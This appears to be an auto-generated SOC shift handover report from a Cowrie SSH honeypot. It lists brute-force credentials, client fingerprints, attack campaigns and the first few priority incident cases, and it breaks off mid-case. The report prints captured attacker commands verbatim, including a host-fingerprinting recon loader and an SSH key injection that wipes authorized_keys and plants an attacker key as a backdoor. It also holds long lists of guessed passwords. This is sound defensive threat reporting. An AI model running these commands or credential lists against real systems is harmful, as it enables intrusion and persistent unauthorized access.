# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-01 |
| **Generated At** | 2026-07-01T20:02:09Z |
| **Shift Time** | 20:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **309** |
| Confirmed Threats | **305** |
| False Positives Filtered | **4** (1.3%) |
| Unique Attacker IPs | **54** |
| Countries of Origin | **16** |
| High Severity Cases | **183** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **126** |
| Malware Samples Analyzed | **4** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **225** |
| Unique Credential Pairs | **149** |
| Unique Usernames | **19** |
| Unique Passwords | **124** |
| Successful Auth Pairs | **196** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 125 |
| `345gs5662d34` | 28 |
| `admin` | 26 |
| `user` | 16 |
| `www` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 28 |
| `3245gs5662d34` | 28 |
| `123456` | 6 |
| `LeitboGi0ro` | 6 |
| `smo@@kkklss` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 28 |
| `root` | `3245gs5662d34` | 24 |
| `root` | `LeitboGi0ro` | 6 |
| `root` | `smo@@kkklss` | 6 |
| `root` | `123@@@` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `alpine` | `91.92.40.240` | 2026-07-01T14:58:12 |
| `root` | `qwe123,./` | `45.205.1.42` | 2026-07-01T15:00:59 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `184.105.247.196` | 2026-07-01T15:01:32 |
| `postgres` | `zaq12wsx` | `41.173.43.34` | 2026-07-01T15:01:35 |
| `345gs5662d34` | `345gs5662d34` | `41.173.43.34` | 2026-07-01T15:01:40 |
| `postgres` | `3245gs5662d34` | `41.173.43.34` | 2026-07-01T15:01:42 |
| `root` | `changeme` | `91.92.40.240` | 2026-07-01T15:02:13 |
| `root` | `Qwerty2018` | `183.222.230.188` | 2026-07-01T15:02:29 |
| `345gs5662d34` | `345gs5662d34` | `183.222.230.188` | 2026-07-01T15:02:33 |
| `root` | `3245gs5662d34` | `183.222.230.188` | 2026-07-01T15:02:35 |
| `root` | `ksk1912` | `52.172.177.191` | 2026-07-01T15:03:14 |
| `345gs5662d34` | `345gs5662d34` | `52.172.177.191` | 2026-07-01T15:03:18 |
| `root` | `3245gs5662d34` | `52.172.177.191` | 2026-07-01T15:03:19 |
| `suliyilei1` | `suliyilei1` | `185.242.3.195` | 2026-07-01T15:04:55 |
| `root` | `QWEasd123!@#` | `45.198.224.120` | 2026-07-01T15:06:11 |
| `root` | `default` | `91.92.40.240` | 2026-07-01T15:06:48 |
| `suliyilei1` | `suliyilei1` | `10.0.0.73` | 2026-07-01T15:08:44 |
| `root` | `r00t` | `91.92.40.240` | 2026-07-01T15:11:46 |
| `root` | `123147` | `43.165.180.54` | 2026-07-01T15:12:56 |
| `345gs5662d34` | `345gs5662d34` | `43.165.180.54` | 2026-07-01T15:12:59 |
| `root` | `3245gs5662d34` | `43.165.180.54` | 2026-07-01T15:13:00 |
| `root` | `root@123` | `91.92.40.240` | 2026-07-01T15:17:05 |
| `root` | `P@ss123` | `45.205.1.42` | 2026-07-01T15:18:02 |
| `root` | `hitcamron1111` | `45.198.224.120` | 2026-07-01T15:18:27 |
| `root` | `Root123` | `91.92.40.240` | 2026-07-01T15:23:13 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-01T15:25:46 |
| `root` | `!root` | `91.92.40.240` | 2026-07-01T15:30:39 |
| `root` | `01234` | `45.198.224.120` | 2026-07-01T15:31:02 |
| `root` | `---fuck_you----` | `117.50.157.229` | 2026-07-01T15:35:02 |
| `root` | `7654321` | `45.205.1.42` | 2026-07-01T15:35:10 |
| `root` | `rootme` | `91.92.40.240` | 2026-07-01T15:38:28 |
| `fengshuai` | `fengshuai` | `45.198.224.120` | 2026-07-01T15:43:36 |
| `admin` | `admin` | `91.92.40.240` | 2026-07-01T15:46:00 |
| `root` | `pass00` | `45.205.1.42` | 2026-07-01T15:52:30 |
| `admin` | `password` | `91.92.40.240` | 2026-07-01T15:53:21 |
| `next` | `next123` | `103.97.101.25` | 2026-07-01T15:55:22 |
| `345gs5662d34` | `345gs5662d34` | `103.97.101.25` | 2026-07-01T15:55:26 |
| `next` | `3245gs5662d34` | `103.97.101.25` | 2026-07-01T15:55:28 |
| `root` | `plm54321plm` | `45.198.224.120` | 2026-07-01T15:55:44 |
| `root` | `dagger` | `14.103.121.146` | 2026-07-01T15:58:25 |
| `345gs5662d34` | `345gs5662d34` | `14.103.121.146` | 2026-07-01T15:58:29 |
| `root` | `3245gs5662d34` | `14.103.121.146` | 2026-07-01T15:58:31 |
| `www` | `www` | `185.242.3.195` | 2026-07-01T15:59:52 |
| `admin` | `123456` | `91.92.40.240` | 2026-07-01T16:00:03 |
| `admin` | `admin123` | `91.92.40.240` | 2026-07-01T16:06:34 |
| `oracle` | `oracle1` | `45.198.224.120` | 2026-07-01T16:07:51 |
| `root` | `password1234` | `45.205.1.42` | 2026-07-01T16:10:05 |
| `root` | `liu123456` | `210.79.190.151` | 2026-07-01T16:12:04 |
| `admin` | `letmein` | `91.92.40.240` | 2026-07-01T16:12:07 |
| `345gs5662d34` | `345gs5662d34` | `210.79.190.151` | 2026-07-01T16:12:09 |
| `root` | `3245gs5662d34` | `210.79.190.151` | 2026-07-01T16:12:10 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-07-01T16:14:59 |
| `admin` | `111111` | `141.11.88.108` | 2026-07-01T16:16:20 |
| `admin` | `000000` | `141.11.88.108` | 2026-07-01T16:16:21 |
| `admin` | `123456` | `141.11.88.108` | 2026-07-01T16:16:22 |
| `admin` | `` | `141.11.88.108` | 2026-07-01T16:16:23 |
| `admin` | `12345678` | `141.11.88.108` | 2026-07-01T16:16:23 |
| `admin` | `1234` | `141.11.88.108` | 2026-07-01T16:16:24 |
| `admin` | `123456789` | `141.11.88.108` | 2026-07-01T16:16:25 |
| `admin` | `12345` | `141.11.88.108` | 2026-07-01T16:16:25 |
| `admin` | `qwerty` | `91.92.40.240` | 2026-07-01T16:17:36 |
| `root` | `88888888` | `45.198.224.120` | 2026-07-01T16:20:07 |
| `root` | `root12345l` | `66.154.109.226` | 2026-07-01T16:21:33 |
| `345gs5662d34` | `345gs5662d34` | `66.154.109.226` | 2026-07-01T16:21:35 |
| `root` | `3245gs5662d34` | `66.154.109.226` | 2026-07-01T16:21:35 |
| `admin` | `12345` | `91.92.40.240` | 2026-07-01T16:22:28 |
| `admin` | `admin@123` | `91.92.40.240` | 2026-07-01T16:27:40 |
| `ubuntu` | `q1w2e3` | `45.205.1.42` | 2026-07-01T16:28:06 |
| `root` | `P@ssw0rd2011` | `45.198.224.120` | 2026-07-01T16:32:18 |
| `admin` | `Admin123` | `91.92.40.240` | 2026-07-01T16:33:04 |
| `admin` | `P@ssw0rd` | `91.92.40.240` | 2026-07-01T16:38:21 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-01T16:38:55 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-01T16:38:55 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-01T16:38:57 |
| `www` | `www` | `10.0.0.73` | 2026-07-01T16:40:15 |
| `admin` | `welcome` | `91.92.40.240` | 2026-07-01T16:43:24 |
| `admin` | `123456` | `45.198.224.120` | 2026-07-01T16:44:09 |
| `root` | `Passw0rd@1234` | `45.205.1.42` | 2026-07-01T16:45:02 |
| `admin` | `passw0rd` | `91.92.40.240` | 2026-07-01T16:47:36 |
| `root` | `motadata` | `43.163.98.17` | 2026-07-01T16:48:26 |
| `345gs5662d34` | `345gs5662d34` | `43.163.98.17` | 2026-07-01T16:48:30 |
| `root` | `3245gs5662d34` | `43.163.98.17` | 2026-07-01T16:48:31 |
| `root` | `qwerty7890` | `10.0.0.73` | 2026-07-01T16:49:23 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-01T16:49:24 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-01T16:49:24 |
| `root` | `111111` | `92.118.39.49` | 2026-07-01T16:49:40 |
| `root` | `1212` | `95.58.255.251` | 2026-07-01T16:50:33 |
| `345gs5662d34` | `345gs5662d34` | `95.58.255.251` | 2026-07-01T16:50:36 |
| `root` | `3245gs5662d34` | `95.58.255.251` | 2026-07-01T16:50:37 |
| `root` | `123` | `92.118.39.49` | 2026-07-01T16:51:36 |
| `admin` | `administrator` | `91.92.40.240` | 2026-07-01T16:52:20 |
| `root` | `123123` | `92.118.39.49` | 2026-07-01T16:53:31 |
| `root` | `123456qw` | `10.0.0.73` | 2026-07-01T16:54:51 |
| `root` | `123321` | `92.118.39.49` | 2026-07-01T16:55:28 |
| `root` | `Xc@123456` | `10.0.0.73` | 2026-07-01T16:56:02 |
| `ubuntu` | `p@ssw0rd` | `45.198.224.120` | 2026-07-01T16:56:11 |
| `admin` | `adminroot` | `91.92.40.240` | 2026-07-01T16:57:21 |
| `root` | `1234` | `92.118.39.49` | 2026-07-01T16:57:26 |
| `root` | `12345` | `92.118.39.49` | 2026-07-01T16:59:21 |
| `michael` | `12345` | `45.205.1.42` | 2026-07-01T17:02:00 |
| `admin` | `adminadmin` | `91.92.40.240` | 2026-07-01T17:02:38 |
| `root` | `1234567` | `92.118.39.49` | 2026-07-01T17:03:26 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-01T17:03:53 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-01T17:03:55 |
| `root` | `12345678` | `92.118.39.49` | 2026-07-01T17:05:38 |
| `user` | `user` | `91.92.40.240` | 2026-07-01T17:07:44 |
| `root` | `justin` | `45.198.224.120` | 2026-07-01T17:07:55 |
| `root` | `123456789` | `92.118.39.49` | 2026-07-01T17:08:05 |
| `root` | `1234abcd` | `92.118.39.49` | 2026-07-01T17:10:42 |
| `root` | `Butvang@123` | `103.191.14.243` | 2026-07-01T17:11:38 |
| `345gs5662d34` | `345gs5662d34` | `103.191.14.243` | 2026-07-01T17:11:43 |
| `root` | `3245gs5662d34` | `103.191.14.243` | 2026-07-01T17:11:45 |
| `user` | `password` | `91.92.40.240` | 2026-07-01T17:12:41 |
| `root` | `123abc` | `92.118.39.49` | 2026-07-01T17:13:35 |
| `root` | `mi123456` | `49.43.241.11` | 2026-07-01T17:14:22 |
| `345gs5662d34` | `345gs5662d34` | `49.43.241.11` | 2026-07-01T17:14:26 |
| `root` | `3245gs5662d34` | `49.43.241.11` | 2026-07-01T17:14:28 |
| `root` | `123qwe` | `92.118.39.49` | 2026-07-01T17:16:54 |
| `root` | `chris` | `103.59.161.120` | 2026-07-01T17:17:02 |
| `345gs5662d34` | `345gs5662d34` | `103.59.161.120` | 2026-07-01T17:17:07 |
| `root` | `3245gs5662d34` | `103.59.161.120` | 2026-07-01T17:17:08 |
| `root` | `root@joinet` | `171.244.37.103` | 2026-07-01T17:17:53 |
| `345gs5662d34` | `345gs5662d34` | `171.244.37.103` | 2026-07-01T17:17:57 |
| `root` | `3245gs5662d34` | `171.244.37.103` | 2026-07-01T17:17:59 |
| `user` | `123456` | `91.92.40.240` | 2026-07-01T17:18:12 |
| `root` | `Password!0` | `45.205.1.42` | 2026-07-01T17:18:29 |
| `root` | `Parasol1` | `45.198.224.120` | 2026-07-01T17:19:29 |
| `sysadmin` | `12345678` | `150.241.77.28` | 2026-07-01T17:20:32 |
| `345gs5662d34` | `345gs5662d34` | `150.241.77.28` | 2026-07-01T17:20:35 |
| `sysadmin` | `3245gs5662d34` | `150.241.77.28` | 2026-07-01T17:20:35 |
| `root` | `1q2w3e` | `92.118.39.49` | 2026-07-01T17:20:47 |
| `user` | `qwerty` | `91.92.40.240` | 2026-07-01T17:24:06 |
| `root` | `1q2w3e4r` | `92.118.39.49` | 2026-07-01T17:25:07 |
| `root` | `1qaz2wsx` | `92.118.39.49` | 2026-07-01T17:30:11 |
| `user` | `12345` | `91.92.40.240` | 2026-07-01T17:30:28 |
| `root` | `admin03` | `45.198.224.120` | 2026-07-01T17:31:07 |
| `www-data` | `1234` | `185.242.3.195` | 2026-07-01T17:31:13 |
| `ubuntu` | `postgres12345678` | `45.205.1.42` | 2026-07-01T17:35:29 |
| `root` | `321` | `92.118.39.49` | 2026-07-01T17:35:47 |
| `user` | `letmein` | `91.92.40.240` | 2026-07-01T17:36:27 |
| `root` | `isg` | `202.155.157.145` | 2026-07-01T17:37:57 |
| `345gs5662d34` | `345gs5662d34` | `202.155.157.145` | 2026-07-01T17:38:01 |
| `root` | `3245gs5662d34` | `202.155.157.145` | 2026-07-01T17:38:03 |
| `root` | `qpalzm!@#Q4` | `10.0.0.73` | 2026-07-01T17:40:37 |
| `root` | `654321` | `92.118.39.49` | 2026-07-01T17:41:26 |
| `user` | `welcome` | `91.92.40.240` | 2026-07-01T17:42:28 |
| `oracle` | `1111111111` | `45.198.224.120` | 2026-07-01T17:42:40 |
| `root` | `drishti` | `103.187.147.214` | 2026-07-01T17:45:10 |
| `345gs5662d34` | `345gs5662d34` | `103.187.147.214` | 2026-07-01T17:45:15 |
| `root` | `3245gs5662d34` | `103.187.147.214` | 2026-07-01T17:45:16 |
| `root` | `P@ssw0rd` | `92.118.39.49` | 2026-07-01T17:47:19 |
| `root` | `dev@2021` | `174.35.25.178` | 2026-07-01T17:47:23 |
| `345gs5662d34` | `345gs5662d34` | `174.35.25.178` | 2026-07-01T17:47:24 |
| `root` | `3245gs5662d34` | `174.35.25.178` | 2026-07-01T17:47:24 |
| `user` | `passw0rd` | `91.92.40.240` | 2026-07-01T17:48:53 |
| `root` | `meowmeow` | `10.0.0.73` | 2026-07-01T17:48:58 |
| `root` | `Qaz123123` | `45.205.1.42` | 2026-07-01T17:51:55 |
| `root` | `P@ssword` | `92.118.39.49` | 2026-07-01T17:53:26 |
| `guest` | `123321` | `45.198.224.120` | 2026-07-01T17:54:57 |
| `user` | `user123` | `91.92.40.240` | 2026-07-01T17:55:37 |
| `root` | `Root123` | `92.118.39.49` | 2026-07-01T17:59:51 |
| `user` | `user1` | `91.92.40.240` | 2026-07-01T18:01:51 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-01T18:03:11 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-01T18:03:11 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-01T18:03:21 |
| `root` | `qwsazx` | `45.198.224.120` | 2026-07-01T18:06:55 |
| `root` | `rootpw` | `10.0.0.73` | 2026-07-01T18:06:57 |
| `root` | `!QA@WS#ED$RF` | `10.0.0.73` | 2026-07-01T18:07:35 |
| `user` | `userpass` | `91.92.40.240` | 2026-07-01T18:08:24 |
| `root` | `P4sswOrd` | `45.205.1.42` | 2026-07-01T18:08:40 |
| `www-data` | `1234` | `10.0.0.73` | 2026-07-01T18:11:11 |
| `root` | `super@123` | `10.0.0.73` | 2026-07-01T18:11:13 |
| `root` | `asd123!!!` | `10.0.0.73` | 2026-07-01T18:13:11 |
| `root` | `teste123@` | `10.0.0.73` | 2026-07-01T18:13:15 |
| `user` | `user@123` | `91.92.40.240` | 2026-07-01T18:14:59 |
| `root` | `secretpass` | `10.0.0.73` | 2026-07-01T18:16:26 |
| `root` | `Preforsa2023*` | `45.198.224.120` | 2026-07-01T18:18:31 |
| `root` | `password01` | `10.0.0.73` | 2026-07-01T18:20:57 |
| `user` | `User123` | `91.92.40.240` | 2026-07-01T18:21:38 |
| `root` | `1qazcde#` | `10.0.0.73` | 2026-07-01T18:22:55 |
| `root` | `Password456` | `45.205.1.42` | 2026-07-01T18:25:44 |
| `root` | `Info@123` | `10.0.0.73` | 2026-07-01T18:26:21 |
| `user` | `guest` | `91.92.40.240` | 2026-07-01T18:29:14 |
| `root` | `qazqwe!#%&` | `45.198.224.120` | 2026-07-01T18:30:20 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-07-01T18:31:08 |
| `user` | `2026` | `143.110.241.64` | 2026-07-01T18:33:23 |
| `345gs5662d34` | `345gs5662d34` | `143.110.241.64` | 2026-07-01T18:33:27 |
| `user` | `3245gs5662d34` | `143.110.241.64` | 2026-07-01T18:33:29 |
| `root` | `!QAZ2wsx2026` | `10.0.0.73` | 2026-07-01T18:36:40 |
| `test` | `test` | `91.92.40.240` | 2026-07-01T18:37:39 |
| `oracle` | `password` | `45.198.224.120` | 2026-07-01T18:41:54 |
| `guest` | `123321` | `45.205.1.42` | 2026-07-01T18:43:01 |
| `minecraft` | `minecraft1` | `10.0.0.73` | 2026-07-01T18:43:24 |
| `test` | `password` | `91.92.40.240` | 2026-07-01T18:45:03 |
| `test` | `123456` | `91.92.40.240` | 2026-07-01T18:52:45 |
| `confluence3` | `confluence3` | `45.198.224.120` | 2026-07-01T18:53:33 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **309** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 103 |
| libssh | 60 |
| Paramiko (Python) | 16 |
| OpenSSH | 5 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 61 | 2 |
| `f555226df196...` | Mirai/variant | 60 | 22 |
| `16443846184e...` | Generic scanner | 39 | 3 |
| `a2de0f306611...` | Mirai/variant | 16 | 3 |
| `a984ff804585...` | libssh-based | 5 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 61 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 60 | 22 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 39 | 3 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 16 | 3 | Mirai/variant |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `873a5fb5fedc...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 60 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 19 | 19 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.240`, `92.118.39.49`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `210.79.190.151`, `143.110.241.64`, `183.222.230.188`, `103.187.147.214`, `103.97.101.25`, `14.103.121.146`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
busybox TEST
```
Source IPs: `141.11.88.108`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **54** |
| Unique ASNs | **40** |
| High-Risk ASNs | **38** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 6 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 2 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (183)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-707598e9d2e8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 14:58 |
| **Last Seen** | 2026-07-01 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:58:11` | `cowrie.session.connect` |
| `2026-07-01 14:58:12` | `cowrie.client.version` |
| `2026-07-01 14:58:12` | `cowrie.client.kex` |
| `2026-07-01 14:58:12` | `cowrie.login.success` |
| `2026-07-01 14:58:13` | `cowrie.session.params` |
| `2026-07-01 14:58:13` | `cowrie.command.input` |
| `2026-07-01 14:58:13` | `cowrie.command.input` |
| `2026-07-01 14:58:13` | `cowrie.command.input` |
| `2026-07-01 14:58:13` | `cowrie.command.input` |
| `2026-07-01 14:58:13` | `cowrie.command.input` |
| `2026-07-01 14:58:13` | `cowrie.command.success` |
| `2026-07-01 14:58:13` | `cowrie.command.input` |
| `2026-07-01 14:58:13` | `cowrie.command.input` |
| `2026-07-01 14:58:13` | `cowrie.command.input` |
| `2026-07-01 14:58:13` | `cowrie.command.input` |
| `2026-07-01 14:58:13` | `cowrie.log.closed` |
| `2026-07-01 14:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-270a6a438c55

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 15:00 |
| **Last Seen** | 2026-07-01 15:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:00:56` | `cowrie.session.connect` |
| `2026-07-01 15:00:56` | `cowrie.client.version` |
| `2026-07-01 15:00:56` | `cowrie.client.kex` |
| `2026-07-01 15:00:59` | `cowrie.login.success` |
| `2026-07-01 15:01:00` | `cowrie.session.params` |
| `2026-07-01 15:01:00` | `cowrie.command.input` |
| `2026-07-01 15:01:01` | `cowrie.log.closed` |
| `2026-07-01 15:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55213a6306bc

| Field | Detail |
|---|---|
| **Source IP** | `184.105.247[.]196` |
| **First Seen** | 2026-07-01 15:01 |
| **Last Seen** | 2026-07-01 15:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.63 Chrome/124.0.6367.63 Not-A.Brand/99  Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:01:32` | `cowrie.session.connect` |
| `2026-07-01 15:01:32` | `cowrie.login.success` |
| `2026-07-01 15:01:33` | `cowrie.session.params` |
| `2026-07-01 15:01:33` | `cowrie.command.input` |
| `2026-07-01 15:01:33` | `cowrie.command.input` |
| `2026-07-01 15:01:33` | `cowrie.command.failed` |
| `2026-07-01 15:01:33` | `cowrie.command.input` |
| `2026-07-01 15:01:33` | `cowrie.command.failed` |
| `2026-07-01 15:01:33` | `cowrie.command.input` |
| `2026-07-01 15:01:33` | `cowrie.log.closed` |
| `2026-07-01 15:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `184.105.247[.]196` to AbuseIPDB if not already reported
- [ ] Block `184.105.247[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a70ab06075c

| Field | Detail |
|---|---|
| **Source IP** | `41.173.43[.]34` |
| **First Seen** | 2026-07-01 15:01 |
| **Last Seen** | 2026-07-01 15:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:01:34` | `cowrie.session.connect` |
| `2026-07-01 15:01:34` | `cowrie.client.version` |
| `2026-07-01 15:01:34` | `cowrie.client.kex` |
| `2026-07-01 15:01:35` | `cowrie.login.success` |
| `2026-07-01 15:01:36` | `cowrie.session.params` |
| `2026-07-01 15:01:36` | `cowrie.command.input` |
| `2026-07-01 15:01:36` | `cowrie.command.failed` |
| `2026-07-01 15:01:37` | `cowrie.log.closed` |
| `2026-07-01 15:01:38` | `cowrie.session.params` |
